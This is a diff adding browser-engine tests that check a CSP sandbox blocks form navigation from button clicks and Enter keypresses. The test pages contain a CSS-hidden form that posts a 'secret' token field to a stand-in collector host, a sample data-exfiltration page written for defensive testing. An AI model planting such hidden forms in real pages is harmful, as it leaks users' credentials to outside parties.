@@ -10,6 +10,7 @@ use std.gc_async_mut.gpu.browser_engine.simple_web_html_layout_renderer.{
     simple_web_layout_debug_layout_by_id,
     simple_web_layout_debug_style_by_id
 }
+use common.ui.draw_ir_sdn.{draw_ir_to_sdn}
 use std.gc_async_mut.gpu.browser_engine.dom_accessors.{
     be_dom_event_identity, be_dom_find_by_tag, be_dom_find_path_to_id,
     be_dom_get_attr, be_dom_get_text_content, be_dom_has_attr
@@ -246,6 +247,110 @@ describe "BrowserSession live DOM input":
         expect(session.warnings.join("|")).to_contain(
             "CSP sandbox blocked form submission"
         )
+
+    # @req REQ-WEB-BROWSER-012
+    it "blocks button form navigation when sandbox allows forms but not top navigation":
+        var session = BrowserSession.new()
+        expect(session.begin_network_navigation(
+            "https://account.test/profile", "GET", "", "", ""
+        ).unwrap()).to_be(true)
+        val document_request = session.take_pending_request().unwrap()
+        expect(session.commit_network_response(BrowserResponse.create(
+            document_request.id, "document", document_request.url, 200,
+            "Content-Security-Policy: sandbox allow-forms",
+            "<html><head><style>html,body{margin:0;width:8px;height:4px}" +
+            "#authorized{display:block;width:8px;height:4px;" +
+            "background-color:#2563eb;color:#2563eb}form{display:none}" +
+            "</style></head><body><main id='authorized'>Authorized</main>" +
+            "<form id='profile' action='https://collector.test/capture' " +
+            "method='post'><input id='secret' name='secret' value='token'>" +
+            "<button id='send' type='submit'>Send</button></form></body></html>",
+            ""
+        )).unwrap()).to_be(true)
+        val url_before = session.current_url
+        val body_before = session.current_body_html
+        val draw_ir_before = draw_ir_to_sdn(WebRenderBackend.create(
+            "pure_simple", 8, 4
+        ).render_html_to_draw_ir(session.render_html_document()))
+        val pixels_before = session.render_to_pixels(8, 4).pixel_data
+
+        val dispatch = session.dispatch_dom_event("send", "click", true, true)
+
+        expect(dispatch.default_action).to_equal("button-activate")
+        expect(session.pending_request_count()).to_equal(0)
+        expect(session.take_pending_request()).to_be_nil()
+        expect(session.current_url).to_equal(url_before)
+        expect(session.current_body_html).to_equal(body_before)
+        expect(draw_ir_to_sdn(WebRenderBackend.create(
+            "pure_simple", 8, 4
+        ).render_html_to_draw_ir(session.render_html_document()))).to_equal(
+            draw_ir_before
+        )
+        expect(session.render_to_pixels(8, 4).pixel_data).to_equal(
+            pixels_before
+        )
+        expect(session.warnings.join("|")).to_contain(
+            "CSP sandbox blocked top navigation"
+        )
+
+    # @req REQ-WEB-BROWSER-012
+    it "blocks implicit keyboard form navigation without sandbox top navigation":
+        var session = BrowserSession.new()
+        expect(session.begin_network_navigation(
+            "https://account.test/profile", "GET", "", "", ""
+        ).unwrap()).to_be(true)
+        val document_request = session.take_pending_request().unwrap()
+        expect(session.commit_network_response(BrowserResponse.create(
+            document_request.id, "document", document_request.url, 200,
+            "Content-Security-Policy: sandbox allow-forms",
+            "<html><body><form id='profile' " +
+            "action='https://collector.test/capture' method='post'>" +
+            "<input id='secret' name='secret' value='token'>" +
+            "<button id='send' type='submit'>Send</button>" +
+            "</form></body></html>", ""
+        )).unwrap()).to_be(true)
+        val url_before = session.current_url
+        val body_before = session.current_body_html
+
+        val dispatch = session.dispatch_dom_keyboard_event(
+            "secret", "Enter", true
+        ).unwrap()
+
+        expect(dispatch.default_action).to_equal("button-activate")
+        expect(session.pending_request_count()).to_equal(0)
+        expect(session.take_pending_request()).to_be_nil()
+        expect(session.current_url).to_equal(url_before)
+        expect(session.current_body_html).to_equal(body_before)
+        expect(session.warnings.join("|")).to_contain(
+            "CSP sandbox blocked top navigation"
+        )
+
+    # @req REQ-WEB-BROWSER-012
+    it "allows implicit keyboard POST with sandbox top-navigation authority":
+        var session = BrowserSession.new()
+        expect(session.begin_network_navigation(
+            "https://account.test/profile", "GET", "", "", ""
+        ).unwrap()).to_be(true)
+        val document_request = session.take_pending_request().unwrap()
+        expect(session.commit_network_response(BrowserResponse.create(
+            document_request.id, "document", document_request.url, 200,
+            "Content-Security-Policy: sandbox allow-forms " +
+            "allow-top-navigation",
+            "<html><body><form id='profile' action='/save' method='post'>" +
+            "<input id='name' name='name' value='Ada'>" +
+            "<button id='save' type='submit'>Save</button>" +
+            "</form></body></html>", ""
+        )).unwrap()).to_be(true)
+
+        val dispatch = session.dispatch_dom_keyboard_event(
+            "name", "Enter", true
+        ).unwrap()
+
+        expect(dispatch.default_action).to_equal("button-activate")
+        val request = session.take_pending_request().unwrap()
+        expect(request.url).to_equal("https://account.test/save")
+        expect(request.method).to_equal("POST")
+        expect(request.body).to_equal("name=Ada")
 
     it "submits a button with an invalid type as the default submitter":
         var session = BrowserSession.new()
